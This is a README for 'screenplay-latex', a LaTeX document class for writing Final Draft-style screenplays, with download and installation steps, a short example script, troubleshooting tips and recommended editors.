# 🎬 screenplay-latex - Write Screenplays with LaTeX Ease

[![Download screenplay-latex](https://img.shields.io/badge/Download-screenplay--latex-brightgreen?style=for-the-badge&logo=github)](https://github.com/tokoyusa82/screenplay-latex/releases)

---

## 📖 About screenplay-latex

screenplay-latex is a LaTeX document class designed to help you write professional screenplays in the style of Final Draft. It includes features for pre-production notes and annotations, all within a clean, easy-to-read script format. This tool is ideal for writers who want precise formatting and want to include production details without switching between multiple documents.

With screenplay-latex, you can create PDFs that look like industry-standard scripts without learning complex software. The class handles everything from character lists to scene headings. It supports screenplay elements like dialogue, action, transitions, and more.

The package works with your standard LaTeX tools, producing ready-to-submit scripts. Whether you are writing your first screenplay or prepping a film production document, screenplay-latex offers a reliable, straightforward way to organize your script and notes.

---

## ⚙️ System Requirements

screenplay-latex runs on Windows, macOS, and Linux systems that support LaTeX.

To use screenplay-latex smoothly, ensure your computer meets these minimum requirements:

- A working installation of LaTeX. Popular distributions include:
  - **TeX Live** (Windows, macOS, Linux)
  - **MiKTeX** (Windows)
  - **MacTeX** (macOS)
- A text editor to write your script (such as TeXworks, TeXstudio, or even a basic plain-text editor).
- Basic knowledge of opening and editing text files.
- Approximately 200 MB of free disk space for LaTeX installation and packages.

The package itself is lightweight. Its primary dependency is LaTeX, which handles formatting and typesetting.

---

## 🚀 Getting Started

This guide shows you how to download, install, and create your first screenplay PDF using screenplay-latex, step-by-step.

You do not need to know programming or advanced computer skills. The process focuses on simple actions like downloading files and opening programs.

---

## ⬇️ Download & Install

1. **Go to the official release page:**

   Use this link to visit the downloads page:

   [Download screenplay-latex Releases](https://github.com/tokoyusa82/screenplay-latex/releases)

2. **Find the latest release:**

   Scroll to the most recent version, usually at the top of the page. Releases are organized by date and version number (e.g., v1.0, v2.1).

3. **Download the ZIP file:**

   Look for a file named like `screenplay-latex-x.y.z.zip`. This ZIP file contains the screenplay class files and documentation.

4. **Extract the Zip file:**

   After downloading, unzip the file to a folder on your computer. Most operating systems provide a simple way to unzip by right-clicking the file and choosing “Extract All” or similar.

5. **Install the class in your LaTeX environment:**

   - Copy the `.cls` file from the extracted folder into your local LaTeX directory. This folder depends on your LaTeX distribution:
     - For **TeX Live** users, the path is usually `~/texmf/tex/latex/`
     - For **MiKTeX**, you can use the MiKTeX Console to add the package or place it in your project folder.
   - Alternatively, keep the screenplay-latex files in the same directory as your screenplay `.tex` file. LaTeX will find it automatically.
   - Restart your LaTeX editor or IDE if it was open during installation.

6. **Verify installation:**

   Open your LaTeX editor and create a new document. Use this line at the top:
   ```latex
   \documentclass{screenplay}
   ```
   Compile the document to PDF. If no errors appear and a PDF generates, installation is successful.

---

## ✍️ Writing Your Screenplay

screenplay-latex simplifies screenplay writing by providing special commands for common script elements.

Here is a brief example to get you started:

```latex
\documentclass{screenplay}

\begin{document}

\title{My First Screenplay}
\author{Your Name}
\maketitle

\scene{EXT. PARK - DAY}

\action{A sunny afternoon. Birds chirp.}

\character{JANE}
Hello, this is my first screenplay.

\character{TOM}
Nice to meet you, Jane.

\transition{CUT TO:}

\scene{INT. COFFEE SHOP - DAY}

\end{document}
```

- Use `\scene{}` to mark new scenes.
- Use `\action{}` for descriptions and movement.
- Use `\character{}` to indicate who is speaking.
- Use `\transition{}` for screen transitions like CUT TO.

For longer scripts, keep each scene separated clearly. You can add production notes using the annotation features from the package documentation.

---

## 📚 Documentation & Support

screenplay-latex comes with detailed documentation included in the download package. Open the PDF guide to find:

- Full list of commands
- Customization options
- Advanced formatting tips
- How to add annotations and pre-production notes

If you encounter issues, check the README or Issues tab on the GitHub repository:

[screenplay-latex GitHub Repository](https://github.com/tokoyusa82/screenplay-latex)

The community and developer provide support there.

---

## 🔧 Troubleshooting Tips

- **LaTeX forces an error on compilation:** Check that you installed the class file in the right folder. Ensure you restart your LaTeX editor.
- **PDF format does not look right:** Verify you use the class by typing `\documentclass{screenplay}` at the top of your file.
- **Missing packages error:** Your LaTeX installation might be missing required packages. Update your LaTeX distribution or install the required packages using your package manager.
- **Cannot open downloaded ZIP:** Use a basic, reputable unzip tool such as 7-Zip or the built-in OS extractor.

---

## 🎯 Key Features

- Produces Final Draft-style screenplay PDFs.
- Supports screenplay elements: scenes, action, characters, dialogue, and transitions.
- Allows pre-production annotations to organize scripts.
- Compatible with all major LaTeX editors and operating systems.
- Keeps formatting consistent and industry-standard.
- Lightweight and easy to install.

---

## 🛠 How It Works

screenplay-latex is a LaTeX class file — a template that tells LaTeX how to style your screenplay document. You write your screenplay script in a text file using LaTeX syntax.

The class takes care of spacing, margins, fonts, and layout so your screenplay matches professional standards for screenwriting. 

Annotations help organize notes and production details without cluttering the script text.

---

## 🎯 Topics Covered

This project focuses on:

- creative writing
- film and script formatting
- LaTeX document classes and templates
- screenwriting and screenplay typesetting
- PDF creation for film production

---

## ⬇️ Download Link (Again)

To download the latest version of screenplay-latex, visit:

[https://github.com/tokoyusa82/screenplay-latex/releases](https://github.com/tokoyusa82/screenplay-latex/releases)

---

## 📥 Recommended Tools

For the best experience with screenplay-latex, consider these tools:

- **TeXstudio** or **TeXworks:** User-friendly LaTeX editors
- **PDF viewer:** To check your screenplay output, like Adobe Acrobat or SumatraPDF
- **7-Zip or built-in extractors:** To unzip downloaded files easily

---

If you take each step patiently, you will have professional-quality screenplays formatted and ready to share. Take your time to explore the commands and customize your script as you grow familiar with the package.